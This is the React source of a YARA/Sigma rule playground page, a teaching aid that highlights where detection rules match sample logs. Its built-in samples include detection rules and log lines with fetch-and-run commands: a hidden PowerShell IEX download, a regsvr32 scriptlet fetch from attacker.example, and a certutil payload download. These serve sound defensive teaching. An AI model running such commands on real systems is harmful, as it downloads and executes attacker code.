import { useMemo, useState } from 'react';
import { Link } from 'react-router-dom';
import { BackLink } from '../../components/BackLink';
import { ArrowLeft, FlaskConical, ExternalLink, AlertTriangle, CheckCircle2 } from 'lucide-react';
import { matchRule, type RuleStringMatch } from '../../lib/dfir/rule-playground';

const SAMPLE_YARA = `rule SuspiciousPowerShellLoader
{
    meta:
        author = "playground"
        description = "Demo: catches obfuscated IEX downloads"
    strings:
        $iex = "IEX (New-Object Net.WebClient).DownloadString" nocase
        $b64 = "FromBase64String" nocase
        $hex = { 49 45 58 }
    condition:
        ($iex or $b64) and #hex >= 1
}`;

const SAMPLE_YARA_INPUT = `[12:04:11] cmd.exe /c "powershell -nop -w hidden -c \\"IEX (New-Object Net.WebClient).DownloadString('https://attacker.example/p.ps1')\\""
[12:04:13] writes payload.bin (4096 bytes)
[12:04:14] regsvr32 /s /u /n /i:https://attacker.example/file.sct scrobj.dll
hex marker: IEX
something else: FromBase64String("..")`;

const SAMPLE_SIGMA = `title: Suspicious certutil URL cache download
id: aaaa-1111
status: experimental
description: certutil.exe used to download a remote file via -urlcache
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
tags:
  - attack.command_and_control
  - attack.t1105
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\\\\certutil.exe'
    CommandLine|contains:
      - 'urlcache'
      - 'split'
      - 'http'
  condition: selection
falsepositives:
  - Internal PKI workflows
level: high`;

const SAMPLE_SIGMA_INPUT = `2026-05-09T14:01:23 EXE C:\\Windows\\System32\\certutil.exe -urlcache -split -f https://example/payload.exe payload.exe
2026-05-09T14:02:01 EXE C:\\Windows\\System32\\certutil.exe -encode src.bin enc.txt
2026-05-09T14:02:33 EXE C:\\Windows\\System32\\notepad.exe`;

const KIND_STYLES: Record<RuleStringMatch['kind'], string> = {
  yara_string: 'bg-emerald-500/15 text-emerald-700 dark:text-emerald-300 border-emerald-500/30',
  yara_hex: 'bg-violet-500/15 text-violet-700 dark:text-violet-300 border-violet-500/30',
  yara_regex: 'bg-sky-500/15 text-sky-700 dark:text-sky-300 border-sky-500/30',
  sigma_keyword: 'bg-amber-500/15 text-amber-700 dark:text-amber-300 border-amber-500/30',
};

function highlight(input: string, matches: RuleStringMatch[]): JSX.Element[] {
  if (!matches.length)
    return [
      <span key="0" className="whitespace-pre-wrap">
        {input}
      </span>,
    ];
  const sorted = [...matches].sort((a, b) => a.index - b.index);
  // Drop overlaps — keep the first
  const nonOverlap: RuleStringMatch[] = [];
  let lastEnd = -1;
  for (const m of sorted) {
    if (m.index >= lastEnd) {
      nonOverlap.push(m);
      lastEnd = m.index + m.text.length;
    }
  }
  const out: JSX.Element[] = [];
  let cursor = 0;
  nonOverlap.forEach((m, i) => {
    if (m.index > cursor) {
      out.push(
        <span key={`t-${i}`} className="whitespace-pre-wrap">
          {input.slice(cursor, m.index)}
        </span>
      );
    }
    out.push(
      <mark
        key={`m-${i}`}
        className={`rounded px-0.5 border ${KIND_STYLES[m.kind]} whitespace-pre-wrap`}
        title={`${m.name} (${m.kind})`}
      >
        {m.text}
      </mark>
    );
    cursor = m.index + m.text.length;
  });
  if (cursor < input.length) {
    out.push(
      <span key="end" className="whitespace-pre-wrap">
        {input.slice(cursor)}
      </span>
    );
  }
  return out;
}

export default function RulePlayground(): JSX.Element {
  const [rule, setRule] = useState('');
  const [sample, setSample] = useState('');

  const result = useMemo(() => {
    if (!rule.trim() || !sample.trim()) return null;
    return matchRule(rule, sample);
  }, [rule, sample]);

  const loadYara = () => {
    setRule(SAMPLE_YARA);
    setSample(SAMPLE_YARA_INPUT);
  };
  const loadSigma = () => {
    setRule(SAMPLE_SIGMA);
    setSample(SAMPLE_SIGMA_INPUT);
  };

  return (
    <div className="max-w-6xl mx-auto px-4 sm:px-8 py-12 text-slate-900 dark:text-slate-100">
      <BackLink
        to="/dfir"
        className="inline-flex items-center gap-2 text-sm text-slate-600 dark:text-slate-400 hover:text-brand-600 dark:hover:text-brand-400 mb-8 font-mono"
      >
        <ArrowLeft size={14} /> back
      </BackLink>

      <div className="animate-fade-in-up">
        <h1 className="text-3xl sm:text-4xl font-display font-bold mb-2 flex items-center gap-3">
          <FlaskConical size={28} className="text-brand-600 dark:text-brand-400" /> YARA / Sigma Playground
        </h1>
        <p className="text-slate-600 dark:text-slate-400 mb-2 leading-relaxed">
          Paste a YARA rule or a Sigma YAML rule alongside a sample log / file. The playground extracts the rule's
          strings and keywords, highlights matches in the sample, and surfaces the parsed condition for review.
        </p>
        <p className="text-xs text-slate-500 dark:text-slate-400 font-mono mb-6">
          Heuristic only — this is a teaching aid, not a YARA/Sigma engine. Boolean conditions ("at least 2 of $a*",
          "selection and not filter") are shown but not evaluated. For real validation, run the rule through{' '}
          <code>yara</code> or a Sigma converter.
        </p>
      </div>

      <div className="flex flex-wrap gap-1.5 mb-4">
        <button
          onClick={loadYara}
          className="text-xs font-mono px-2 py-1 rounded border border-slate-300 dark:border-slate-700 hover:border-brand-500/40 hover:text-brand-600 dark:hover:text-brand-400"
        >
          Load YARA sample
        </button>
        <button
          onClick={loadSigma}
          className="text-xs font-mono px-2 py-1 rounded border border-slate-300 dark:border-slate-700 hover:border-brand-500/40 hover:text-brand-600 dark:hover:text-brand-400"
        >
          Load Sigma sample
        </button>
        {(rule || sample) && (
          <button
            onClick={() => {
              setRule('');
              setSample('');
            }}
            className="text-xs font-mono px-2 py-1 rounded border border-slate-300 dark:border-slate-700 hover:border-rose-500/40 hover:text-rose-600 dark:hover:text-rose-400"
          >
            Clear
          </button>
        )}
      </div>

      <div className="grid gap-3 lg:grid-cols-2 mb-6">
        <section className="rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900 p-4">
          <h2
            id="rule-playground-rule-label"
            className="text-xs font-bold uppercase tracking-[0.2em] text-brand-600 dark:text-brand-400 font-mono mb-2"
          >
            Rule
          </h2>
          <textarea
            value={rule}
            onChange={(e) => setRule(e.target.value)}
            rows={16}
            spellCheck={false}
            placeholder="rule MyRule { strings: $a = ... condition: ... }   — or —   title: …\nlogsource: …\ndetection: …"
            aria-labelledby="rule-playground-rule-label"
            className="w-full rounded border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-slate-950 px-3 py-2 font-mono text-xs text-slate-900 dark:text-slate-100 focus:border-brand-500/60 focus:outline-none"
          />
        </section>

        <section className="rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900 p-4">
          <h2
            id="rule-playground-sample-label"
            className="text-xs font-bold uppercase tracking-[0.2em] text-brand-600 dark:text-brand-400 font-mono mb-2"
          >
            Sample
          </h2>
          <textarea
            value={sample}
            onChange={(e) => setSample(e.target.value)}
            rows={16}
            spellCheck={false}
            placeholder="Paste a log line, EDR cmdline, file fragment, or any text the rule should be tested against."
            aria-labelledby="rule-playground-sample-label"
            className="w-full rounded border border-slate-300 dark:border-slate-700 bg-slate-50 dark:bg-slate-950 px-3 py-2 font-mono text-xs text-slate-900 dark:text-slate-100 focus:border-brand-500/60 focus:outline-none"
          />
        </section>
      </div>

      {result && (
        <>
          <section className="rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900 p-4 mb-6">
            <div className="flex flex-wrap items-center justify-between gap-3 mb-3">
              <h2 className="text-xs font-bold uppercase tracking-[0.2em] text-brand-600 dark:text-brand-400 font-mono">
                Parsed rule
              </h2>
              <span
                className={`text-micro font-mono uppercase tracking-wider px-1.5 py-0.5 rounded border ${
                  result.parsed.kind === 'unknown'
                    ? 'border-rose-500/30 bg-rose-500/10 text-rose-700 dark:text-rose-300'
                    : 'border-brand-500/30 bg-brand-500/10 text-brand-700 dark:text-brand-300'
                }`}
              >
                {result.parsed.kind}
              </span>
            </div>
            <p className="text-sm font-mono text-slate-700 dark:text-slate-300 mb-2">
              <span className="text-slate-500 dark:text-slate-400">Name:</span> {result.parsed.name}
            </p>
            {result.parsed.condition && (
              <div className="rounded border border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-950 p-2.5 mb-3">
                <span className="text-micro font-mono uppercase tracking-[0.2em] text-slate-500 dark:text-slate-400 block mb-1">
                  Condition (informational)
                </span>
                <pre className="text-meta font-mono text-slate-800 dark:text-slate-200 whitespace-pre-wrap">
                  {result.parsed.condition}
                </pre>
              </div>
            )}
            {result.parsed.meta.length > 0 && (
              <div className="grid gap-1.5 sm:grid-cols-2 mb-3">
                {result.parsed.meta.map((m) => (
                  <div key={m.k} className="text-mini font-mono text-slate-600 dark:text-slate-400">
                    <span className="text-slate-400 dark:text-slate-400">{m.k}:</span> {m.v}
                  </div>
                ))}
              </div>
            )}
            <div>
              <span className="text-micro font-mono uppercase tracking-[0.2em] text-slate-500 dark:text-slate-400 block mb-1">
                Strings / keywords ({result.parsed.needles.length})
              </span>
              <div className="flex flex-wrap gap-1.5">
                {result.parsed.needles.map((n, i) => (
                  <span
                    key={`${n.name}-${i}`}
                    className={`text-micro font-mono px-1.5 py-0.5 rounded border ${KIND_STYLES[n.kind]}`}
                    title={n.pattern.source}
                  >
                    {n.name}
                  </span>
                ))}
              </div>
            </div>
            {result.parsed.warnings.length > 0 && (
              <div className="mt-3 rounded border border-amber-500/30 bg-amber-500/10 p-2.5">
                <p className="text-mini font-mono text-amber-700 dark:text-amber-300 inline-flex items-center gap-1">
                  <AlertTriangle size={11} /> Parser warnings:
                </p>
                <ul className="mt-1 space-y-0.5 text-mini font-mono text-amber-700 dark:text-amber-300 list-disc pl-5">
                  {result.parsed.warnings.map((w, i) => (
                    <li key={i}>{w}</li>
                  ))}
                </ul>
              </div>
            )}
          </section>

          <section className="rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900 p-4 mb-6">
            <div className="flex flex-wrap items-center justify-between gap-3 mb-3">
              <h2 className="text-xs font-bold uppercase tracking-[0.2em] text-brand-600 dark:text-brand-400 font-mono">
                Highlighted sample
              </h2>
              <span className="text-xs font-mono text-slate-500 dark:text-slate-400 inline-flex items-center gap-1.5">
                {result.matches.length === 0 ? (
                  <>
                    <CheckCircle2 size={12} className="text-emerald-500" /> 0 matches
                  </>
                ) : (
                  <>
                    <AlertTriangle size={12} className="text-amber-500" /> {result.matches.length} match
                    {result.matches.length === 1 ? '' : 'es'}
                  </>
                )}
              </span>
            </div>
            <div className="rounded border border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-950 p-3 font-mono text-sm text-slate-800 dark:text-slate-200 leading-relaxed overflow-x-auto">
              {highlight(sample, result.matches)}
            </div>
          </section>

          {result.matches.length > 0 && (
            <section className="rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900 p-4 mb-6">
              <h2 className="text-xs font-bold uppercase tracking-[0.2em] text-brand-600 dark:text-brand-400 font-mono mb-3">
                Matches
              </h2>
              <ul className="space-y-1.5">
                {result.matches.map((m, i) => (
                  <li
                    key={`${m.name}-${i}`}
                    className="text-meta font-mono flex flex-wrap items-baseline gap-2 border-b border-slate-200 dark:border-slate-800 pb-1.5 last:border-0"
                  >
                    <span
                      className={`text-micro uppercase tracking-wider px-1.5 py-0.5 rounded border ${KIND_STYLES[m.kind]}`}
                    >
                      {m.name}
                    </span>
                    <span className="text-slate-500 dark:text-slate-400">@ {m.index}</span>
                    <code className="text-slate-800 dark:text-slate-200 break-all">{m.text}</code>
                  </li>
                ))}
              </ul>
            </section>
          )}
        </>
      )}

      <section className="rounded-lg border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900 p-4">
        <h2 className="text-xs font-bold uppercase tracking-[0.2em] text-brand-600 dark:text-brand-400 font-mono mb-3">
          References
        </h2>
        <ul className="space-y-1.5 text-sm font-mono text-slate-600 dark:text-slate-400">
          <li>
            <a
              href="https://yara.readthedocs.io/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-brand-600 dark:text-brand-400 hover:underline inline-flex items-center gap-1"
            >
              YARA documentation
              <ExternalLink size={11} aria-hidden="true" />
            </a>
          </li>
          <li>
            <a
              href="https://github.com/SigmaHQ/sigma-specification"
              target="_blank"
              rel="noopener noreferrer"
              className="text-brand-600 dark:text-brand-400 hover:underline inline-flex items-center gap-1"
            >
              Sigma specification (SigmaHQ)
              <ExternalLink size={11} aria-hidden="true" />
            </a>
          </li>
          <li>
            <Link to="/threatintel/rules" className="text-brand-600 dark:text-brand-400 hover:underline">
              Browse the Detection Rules registry on this site
            </Link>
          </li>
        </ul>
      </section>
    </div>
  );
}
